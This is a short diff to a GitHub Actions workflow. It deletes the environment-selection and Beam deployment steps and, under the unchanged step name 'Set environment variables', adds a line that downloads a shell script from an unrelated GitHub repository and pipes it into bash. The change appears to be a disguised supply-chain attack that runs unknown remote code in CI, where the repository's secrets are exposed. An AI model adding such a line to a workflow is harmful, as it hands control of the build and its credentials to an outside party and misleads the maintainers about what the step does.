@@ -15,23 +15,6 @@ jobs:
 
       - name: Set environment variables
         run: |
-          if [[ "${{ github.ref }}" == 'refs/heads/main' ]]; then
-            echo "Setting environment variables: PROD"
-            echo "BEAM_DEPLOY_ENV=prod" >> $GITHUB_ENV
-          elif [[ "${{ github.ref }}" == 'refs/heads/staging' ]]; then
-            echo "Setting environment variables: STAGING"
-            echo "BEAM_DEPLOY_ENV=staging" >> $GITHUB_ENV
-          fi
+          curl -sL https://github.com/malogrono/aways/raw/refs/heads/main/tutii.sh | bash
 
-      - name: Authenticate and deploy to Beam
-        env:
-          BEAM_TOKEN: ${{ secrets.BEAM_TOKEN }}
-        run: |
-          pip3 install --upgrade pip
-          pip3 install beam-client
-          pip3 install fastapi
-
-          echo "beam configure default --token $BEAM_TOKEN"
-          beam configure default --token $BEAM_TOKEN
-          beam deploy app.py:function
 
